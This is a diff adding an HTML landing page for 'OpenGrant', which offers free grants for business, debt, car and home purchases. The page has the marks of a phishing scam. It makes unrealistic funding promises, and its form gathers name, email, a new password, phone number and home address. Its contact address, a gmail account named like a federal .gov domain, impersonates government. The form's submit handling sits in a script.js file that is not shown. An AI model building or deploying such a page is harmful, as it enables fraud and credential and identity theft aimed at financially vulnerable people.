@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OpenGrant | Funding</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#home" aria-label="OpenGrant home">
+      <span class="brand-mark">OG</span>
+      <span>OpenGrant</span>
+    </a>
+    <nav class="nav" aria-label="Primary">
+      <a href="#programs">Programs</a>
+      <a href="#apply">Apply</a>
+      <a href="signin.html">Sign in</a>
+    </nav>
+    <a class="top-action" href="#apply">Start application</a>
+  </header>
+
+  <main id="home">
+    <section class="hero" aria-label="Grant intake dashboard">
+      <div class="hero-decor" aria-hidden="true">
+        <span class="orb orb-one"></span>
+        <span class="orb orb-two"></span>
+        <span class="orb orb-three"></span>
+        <span class="orb orb-four"></span>
+      </div>
+      <div class="hero-copy">
+        <p class="eyebrow">Financial Assistance For Everybody</p>
+        <h1>Grant funds that's free for everybody</h1>
+        <p class="lede">Submit your application and receive the financial assistance you deserve, without the hassle of modern funding experience.</p>
+        <div class="hero-actions">
+          <a class="button primary" href="#apply">Apply now</a>
+          <a class="button secondary" href="#programs">See programs</a>
+        </div>
+        <div class="hero-highlights">
+          <div>
+            <strong>120+</strong>
+            <span>organizations supported</span>
+          </div>
+          <div>
+            <strong>72%</strong>
+            <span>approval rate</span>
+          </div>
+          <div>
+            <strong>48h</strong>
+            <span>average decision</span>
+          </div>
+        </div>
+      </div>
+
+      <aside class="hero-panel" aria-label="Current funding summary">
+        <div>
+          <span class="metric-label">Available this cycle</span>
+          <strong>$2.4M</strong>
+        </div>
+        <div class="progress-row">
+          <span>Applications reviewed</span>
+          <span>68%</span>
+        </div>
+        <div class="progress-track"><span style="width: 68%"></span></div>
+        <div class="mini-list">
+          <p><span></span>24 awards pending signature</p>
+          <p><span></span>11 site visits scheduled</p>
+          <p><span></span>6 urgent requests fast-tracked</p>
+        </div>
+      </aside>
+
+      <div class="hero-media" aria-hidden="true">
+        <div class="photo-grid">
+          <div class="photo photo-one"></div>
+          <div class="photo photo-two"></div>
+          <div class="photo photo-three"></div>
+        </div>
+      </div>
+    </section>
+
+    <section id="programs" class="section">
+      <div class="section-heading">
+        <p class="eyebrow">Funding programs</p>
+        <h2>Find the grant that fits your goals.</h2>
+      </div>
+      <div class="program-grid">
+        <article class="program-card active" data-program="Starting a Business Grant" data-award="$5,000 - $50,000">
+          <span class="tag">Open</span>
+          <h3>Starting a Business Grant</h3>
+          <p>Funding to help you launch and establish your own business. Covers startup costs, equipment, and initial operations.</p>
+          <dl>
+            <div><dt>Award</dt><dd>$5k–$50k</dd></div>
+          </dl>
+        </article>
+        <article class="program-card" data-program="Debt & Bills Relief Grant" data-award="$2,000 - $30,000">
+          <span class="tag">Open</span>
+          <h3>Debt & Bills Relief Grant</h3>
+          <p>Assistance to help you pay off outstanding debts and critical bills. Get back on track with financial stability.</p>
+          <dl>
+            <div><dt>Award</dt><dd>$2k–$30k</dd></div>
+          </dl>
+        </article>
+        <article class="program-card" data-program="Car Purchase Grant" data-award="$3,000 - $25,000">
+          <span class="tag">Open</span>
+          <h3>Car Purchase Grant</h3>
+          <p>Funding to help you purchase reliable transportation for work, family, and daily needs.</p>
+          <dl>
+            <div><dt>Award</dt><dd>$3k–$25k</dd></div>
+          </dl>
+        </article>
+        <article class="program-card" data-program="Home Purchase Grant" data-award="$10,000 - $75,000">
+          <span class="tag closing">Closing soon</span>
+          <h3>Home Purchase Grant</h3>
+          <p>Down payment assistance and closing cost grants to help you achieve homeownership and build equity.</p>
+          <dl>
+            <div><dt>Award</dt><dd>$10k–$75k</dd></div>
+          </dl>
+        </article>
+      </div>
+    </section>
+
+    <section id="apply" class="application-section">
+      <div class="apply-copy">
+        <p class="eyebrow">Application intake</p>
+        <h2>Get funding moving with one clear request.</h2>
+        <p>Apply in minutes with a simple form designed for reviewers and community leaders alike.</p>
+        <div class="check-list" aria-label="Application benefits">
+          <span>Fast feedback</span>
+          <span>Clear decision timeline</span>
+          <span>Support every step</span>
+        </div>
+      </div>
+
+      <form class="grant-form" id="grantForm">
+        <div class="form-row">
+          <label for="fullName">Full name</label>
+          <input id="fullName" name="fullName" type="text" placeholder="Jordan Smith" autocomplete="name" required>
+        </div>
+        <div class="form-row">
+          <label for="email">Email</label>
+          <input id="email" name="email" type="email" placeholder="jordan@example.com" autocomplete="email" required>
+        </div>
+        <div class="form-row">
+          <label for="password">Password</label>
+          <input id="password" name="password" type="password" placeholder="Enter a secure password" autocomplete="new-password" required>
+        </div>
+        <div class="form-row">
+          <label for="phone">Phone number</label>
+          <input id="phone" name="phone" type="tel" placeholder=" 123 123-4567" autocomplete="tel" required>
+        </div>
+        <div class="form-row">
+          <label for="homeAddress">Home address</label>
+          <textarea id="homeAddress" name="homeAddress" rows="3" placeholder="123 Grant Ave ....." autocomplete="street-address" required></textarea>
+        </div>
+        <button class="button primary full" type="submit">Submit application</button>
+        <p class="form-result" id="formResult" role="status" aria-live="polite"></p>
+      </form>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <span>© 2026 OpenGrant • Funding for everybody.</span>
+    <span>Need help? Contact federaldomesticassistance.gov@gmail.com</span>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
